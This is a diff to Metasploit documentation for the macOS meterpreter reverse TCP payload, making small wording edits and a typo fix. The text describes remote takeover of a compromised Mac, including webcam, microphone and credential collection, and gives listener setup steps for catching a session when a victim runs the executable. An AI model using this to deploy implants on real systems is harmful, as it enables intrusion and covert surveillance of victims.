@@ -1,6 +1,6 @@
 osx/x64/meterpreter_reverse_tcp is similar to the linux meterpreter, but built for OSX.
 It allows you to remotely take over the compromised system, having control of the file system,
-webcam, screenshot and microphone, and collect sensitive information such as credentials
+webcam, microphone, screenshot and collect sensitive information such as credentials
 using post modules, etc.
 
 ## Vulnerable Application
@@ -8,8 +8,6 @@ using post modules, etc.
 osx/x64/meterpreter_reverse_tcp 64-bit MacOSX platforms from 10.8 onwards.
 
 ## Deploying osx/x64/meterpreter_reverse_tcp
-
-**As a standalone executable**
 
 To use osx/x64/meterpreter_reverse_tcp as an executable, first you can generate it with msfvenom:
 
@@ -25,7 +23,7 @@ Before sending the executable to the victim machine, you need to set up the hand
 4. Do: ```set LHOST [Your IP]```
 5. Do: ```run```
 
-And that should start the listener. When the victim runs the malicious exectauble, you should
+And that should start the listener. When the victim runs the malicious executable, you should
 receive a session:
 
 ```
